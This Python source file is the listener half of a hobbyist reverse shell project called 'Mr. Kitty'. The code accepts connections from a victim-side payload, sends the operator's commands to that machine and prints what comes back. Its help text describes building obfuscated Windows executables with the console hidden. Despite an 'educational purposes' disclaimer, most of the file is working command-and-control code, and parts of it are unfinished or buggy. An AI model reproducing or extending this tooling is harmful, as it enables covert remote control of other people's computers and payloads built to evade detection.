import platform # getting info about the system with this command
import argparse # user-friendly command-line interfaces
import socket # network stuff
import shlex # lexical analysis on the Unix shell
import subprocess # spawn processes, connect to I/O pipes, obtain return codes
import sys # system stuff
import textwrap # wrapping text
import threading
import json
import os
import time

# CONSTS:
IP = '0.0.0.0'
PORT = 9998

def recvFromTarget(socket):
        pass

def sendFromSource(socket, buffer):
    jsonData = json.dumps(buffer)
    socket.send(jsonData.encode())

# MrKitty class
class MrKitty:
    def __init__(self, fileName, format, obfuscator, allowConsole):

        self.fileName = fileName
        self.format = format
        self.obfuscator = obfuscator
        self.allowConsole = allowConsole

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
    def createExecutable(self):
        # STILL IN WORK
        obfuscatorString = f"pyarmor obfuscate --exact kittyPayload.py"
        pyinstallerString = f"cd dist && python -m PyInstaller kittyPayload.py"

    def runAndListen(self):
        self.sock.bind((IP, PORT)) # listen to the requests on 127.0.0.1:9998
        self.sock.listen(5) # 5 maximum back log connections
        print(f'[*] Server is listening on IP {IP}:{PORT}')

        while True:
            #we receive the client socket in the client variable and the remote connection details in address:
            client, address = self.sock.accept()

            print(f'[*] Connection found from {address[0]}:{address[1]}')
            self.handleClient(client)
            # clientThread = threading.Thread(target=self.handleClient, args=(client))
            # clientThread.start()

    def handleClient(self, clientSocket):
            # we are executing a command 
            result = ''
            while True:
                print("#>> Waiting for response..", end='\n')
                def recvFromTarget():
                    while True:
                        data = ''
                        try:
                            data += clientSocket.recv(1024).decode("utf-8").rstrip()
                            try:
                                return json.loads(data)
                            except Exception as e:
                                print(f"Exception:{e}")
                                break
                        except ValueError as e:
                            continue
                result = recvFromTarget()
                print(result)
                try:
                    buffer = input("#>> ")

                    if buffer == 'quit':
                        print("#>> Connection closed.")
                        break
                    elif buffer == 'clear':
                        os.system('clear') # clear the console
                        sendFromSource(clientSocket, buffer) # doesn t work on windows tho
                    else:
                        sendFromSource(clientSocket, buffer)
                except Exception as e:
                    print(f'Server killed: {e}')
                    break
            
            self.sock.close()
            sys.exit()
        
        

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description=
        '''
            !!! USE IT WITH CAUTION (FOR EDUCATIONAL PURPOSES) !!!
                 .__....._             _.....__,
                    .": o :':         ;': o :".
                    `. `-' .'.       .'. `-' .'
                      `---'             `---'

            _...----...      ...   ...      ...----..._
         .-'__..-""'----    `.  `"`  .'    ----'""-..__`-.
        '.-'   _.--"""'       `-._.-'       '"""--._   `-.`
        '  .-"'                  :                  `"-.  ` - Mr. Kitty (alpha v1.0.1)
          '   `.              _.'"'._              .'   `
                `.       ,.-'"       "'-.,       .'
                  `.                           .'
                    `-._                   _.-'
                        `"'--...___...--'"`

        Mr. Kitty is a simple (IN PROGRESS) Python reverse shell project.
        When the connection is succesful, you can write commands on the client's machine. 
        It also returns the version and the name of the client's Operating System.
        For now, mrKitty is not doing too much, I just wanted to learn how can I actually do this.
        There is a lot of work, I will add other functionalities sooner or later.
        ''',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(
            '''
            Example:
            ------------------------------------------------------------------
            FOR WINDOWS:
            python mainKitty.py --customName kitty --allowconsole False  # creates the "kitty.exe" payload without a visible console.
            python mainKitty.py --format .exe --allowconsole False --obfuscate True #obfuscates the payload and then creates the kitty.exe without a visible console.

            ------------------------------------------------------------------
            Since you cannot create .exe files in Linux, I will try to add more functionality to Linux soon. 
            '''
        )  
    )
    parser.add_argument('-name', '--customName', help='Create a custom name for the executable')
    parser.add_argument('-allowconsole', '--allowconsole', help='Set the payload\'s console visibility')
    parser.add_argument('-obfuscate', '--obfuscate', help='Obfuscate the payload')
    parser.add_argument('-run', '--run', action='store_true', help='Run the reverse shell and wait for the incoming connections')
    parser.add_argument('-createExe', '--createExe', help="Create executable.")
    args = vars(parser.parse_args())

    fileName = None
    format = "exe"
    obfuscator = False
    allowConsole = False
    
    if args['createExe']:
        # VERIFYING ARGUMENTS
        if args['customName']:
            fileName = str(args['customName']) + ".exe"
        else:
            fileName = "mrKitty"

        if args['format']:
            if str(args['format']) == "py":
                format = "py"

        if args['obfuscate']:
            if bool(args['obfuscate']) == True:
                obfuscator = True
    # print(fileName)

    kitty = MrKitty(fileName, format, obfuscator, allowConsole)
    if args['run']:
        kitty.runAndListen()
    

    